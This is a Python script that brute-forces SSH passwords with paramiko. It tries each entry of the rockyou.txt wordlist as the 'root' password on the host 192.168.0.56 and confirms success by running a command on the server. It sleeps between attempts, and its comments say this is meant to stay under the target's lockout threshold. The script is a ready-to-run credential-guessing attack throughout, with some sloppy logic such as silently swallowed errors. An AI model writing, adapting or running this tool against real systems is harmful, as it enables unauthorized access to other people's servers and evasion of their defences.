import socket
import paramiko
import sys
import os
import time

# Create a class for this to do TOR based stuff
def read_file(wordlist):
    # Words inside the list which are returned to be processed upon password crack
    words = []
    with open(wordlist, 'rb') as f:
        # Read the lines in the file
        lines = f.readlines()
        # For each line in the lines
        for line in lines:
            # Forget about encodings, just remove the byte padding from the file.
            line = str(line)[2:-3]
            # Append all the words from the line and use them.
            words.append(line)
    
    # Close the file stream
    f.close()
    
    # Return the list of words which will be processed on the SSH password
    return words

def login_ssh(wordlist, target, user):
    try:
        # We have not yet found anything upon start of program so of course it is False.
        password_found = False
        # While nothing has been found, iterate a connection to the target. 
        while password_found is False:
            
            server, username, password = (target, user, wordlist)
            ssh = paramiko.SSHClient()
            ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
            ssh.connect(server, username=username, password=wordlist, timeout = 3)
            # Checking we are successful 
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("ls /tmp")
            # If stdout gives some bytes, send back the password.
            if len(ssh_stdout.read()) > 0:
                print("Password Found: {}".format(wordlist))
                # Found is no longer false so the loop is over
                password_found = True
                # Close SSH connection
                ssh.close()
               
            # When true is reached, goodbye while loop
            return password_found
           
    # Skip any Paramiko problems.
    except Exception:
        pass

if __name__ == "__main__":

    # Specify the wordlist: Needs to be present in your local directory
    wordlist = read_file('rockyou.txt')
    # Separate loop control for this loop as its not the same as the while loop in the function
    print("Attempting password crack")
    for words in range(len(wordlist)):
        login = login_ssh(wordlist[words], '192.168.0.56', 'root')
        # Once we want find True, we want no further print messages
        if login == True:
            # Kill the for loop
            break
        print("Trying password: {}".format(wordlist[words]))
        # Allowing 3 attempts to be made just under the threshold of 600
        threshold = time.sleep(200.1)
        print("Sleeping for 200 seconds")
        # The password is found, we no longer want to request further connections
